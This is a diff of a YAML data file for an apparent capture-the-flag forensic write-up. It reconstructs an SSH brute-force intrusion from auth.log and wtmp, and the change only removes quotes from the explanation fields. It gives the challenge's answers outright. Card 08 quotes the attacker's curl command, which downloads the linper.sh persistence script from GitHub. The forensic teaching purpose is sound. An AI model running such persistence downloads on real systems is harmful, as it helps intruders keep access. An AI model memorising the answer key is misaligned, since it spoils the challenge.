@@ -46,7 +46,7 @@ cards:
     card_title: question 01
     question: What is the IP address used by the attacker to carry out the brute force attack?
     answer: "65.2.161.68"
-    explanation: "If we look through all the failed password attempts from brute forcing, we will find all of them are from 65.2.161.68"
+    explanation: If we look through all the failed password attempts from brute forcing, we will find all of them are from 65.2.161.68
     terminal_title: "auth.log"
     terminal_code1: "cat auth.log | grep -i failed | tail -n 5"
     terminal_output1: |-
@@ -59,7 +59,7 @@ cards:
     card_title: "question 02"
     question: "The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"
     answer: "root"
-    explanation: "To find this, we can query the log for accepted passwords from the attacker's IP.We can correlate the time the brute force attacks stopped with the time   each account's password was accepted We can see that right after a certain account's password was cracked the attacker stopped brute forcing."
+    explanation: To find this, we can query the log for accepted passwords from the attacker's IP.We can correlate the time the brute force attacks stopped with the time   each account's password was accepted We can see that right after a certain account's password was cracked the attacker stopped brute forcing.
     terminal_title: "auth.log"
     terminal_code1: "cat auth.log|grep -i accepted |grep 65.2.161.68"
     terminal_output1: |-
@@ -70,7 +70,7 @@ cards:
     card_title: "question 03"
     question: "What is the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives?"
     answer: "2024-03-06 06:32:45"
-    explanation: "The answer would be the second root login we saw from the previous question. But the question also says use the wtmp file because the one in auth.log is different from the correct one. TO find the one in wtmp, we will have to parse it using the .py file given to us. Then we would have to filter that log for only the attacker's IP then find the timestamp closest to the second root login seen in the previous question because the only difference between the auth.log's and the wtmp file's timestamp is that the auth.log gives us the time he authenticated and the wtmp will give us the time he actually logged in. I used timelineExplorer.exe (eric zimmerman) to view the parsed output, you can use any other alternative for timeline views or you can `cat` the parsed output or if you are on windows use the `type` command. **YOU WILL NEED TO CHANGE THE TIMESTAMPS OF THE WTMP FILE TO UTC.**"
+    explanation: The answer would be the second root login we saw from the previous question. But the question also says use the wtmp file because the one in auth.log is different from the correct one. TO find the one in wtmp, we will have to parse it using the .py file given to us. Then we would have to filter that log for only the attacker's IP then find the timestamp closest to the second root login seen in the previous question because the only difference between the auth.log's and the wtmp file's timestamp is that the auth.log gives us the time he authenticated and the wtmp will give us the time he actually logged in. I used timelineExplorer.exe (eric zimmerman) to view the parsed output, you can use any other alternative for timeline views or you can `cat` the parsed output or if you are on windows use the `type` command. **YOU WILL NEED TO CHANGE THE TIMESTAMPS OF THE WTMP FILE TO UTC.**
     terminal_title: "utmp.py"
     terminal_code1: "py utmp.py wtmp -o parsed.csv"
     terminal_code2: "timelineexplorer.exe parsed.csv"
@@ -78,7 +78,7 @@ cards:
     card_title: "question 04"
     question: "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?"
     answer: "37"
-    explanation: "If we go back to question 2 and look at the script block area, we will see the timestamp of when the attacker manually logged in as root (the second output). It is not the first because the first output was part of the brute force attack. To find the answer for this, we need to `cat` the auth.log and filter the exact timestamp the user logged in as root and then look at the session ID given."
+    explanation: If we go back to question 2 and look at the script block area, we will see the timestamp of when the attacker manually logged in as root (the second output). It is not the first because the first output was part of the brute force attack. To find the answer for this, we need to `cat` the auth.log and filter the exact timestamp the user logged in as root and then look at the session ID given.
     terminal_title: "auth.log"
     terminal_code1: "cat auth.log|grep 06:32:44"
     terminal_output1: |-
@@ -97,13 +97,13 @@ cards:
     card_title: "question 06"
     question: "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"
     answer: "T1136.001"
-    explanation: "For this question, we can just simply google "mitre new account persistence" or something similar, we could also go to the mitre attack website and look for the one that matches. The type of account to look for is local since the attacker only made a local working home environment for the user account they created."
+    explanation: For this question, we can just simply google "mitre new account persistence" or something similar, we could also go to the mitre attack website and look for the one that matches. The type of account to look for is local since the attacker only made a local working home environment for the user account they created.
     terminal_title: "MITRE ATT&CK"
   card7:
     card_title: "question 07"
     question: "What time did the attacker's first SSH session end according to auth.log?"
     answer: "2024-03-06 06:37:24"
-    explanation: "At first I thought the answer would be the actual first one, but instead we have to look for the one they manually logged in to. Since we already know that the attacker's first manual login had a session ID of 37, we can filter out the events for only session 37 we will see the time he first logged on and the time that account logged out."  
+    explanation: At first I thought the answer would be the actual first one, but instead we have to look for the one they manually logged in to. Since we already know that the attacker's first manual login had a session ID of 37, we can filter out the events for only session 37 we will see the time he first logged on and the time that account logged out.
     terminal_title: "auth.log"
     terminal_code1: "cat auth.log|grep -i \"session 37\""
     terminal_output1: |-
@@ -114,7 +114,7 @@ cards:
     card_title: "question 08"
     question: "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
     answer: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
-    explanation: "Since we already know the name of the backdoor account and that it is in the sudo group, it is capable of using sudo. We have also been told that the attacker needed to utilize his higher privileges to download a script and that it was done with the help of sudo. We also know that these kinds of commands get logged in the auth.log file along with the name of the account that used it. This means that we can filter for the name of the backdoor account + sudo and we will see its name and the commands run."
+    explanation: Since we already know the name of the backdoor account and that it is in the sudo group, it is capable of using sudo. We have also been told that the attacker needed to utilize his higher privileges to download a script and that it was done with the help of sudo. We also know that these kinds of commands get logged in the auth.log file along with the name of the account that used it. This means that we can filter for the name of the backdoor account + sudo and we will see its name and the commands run.
     terminal_title: "auth.log"
     terminal_code1: "cat auth.log|grep -i cyberjunkie|grep -i sudo"
     terminal_output1: |-
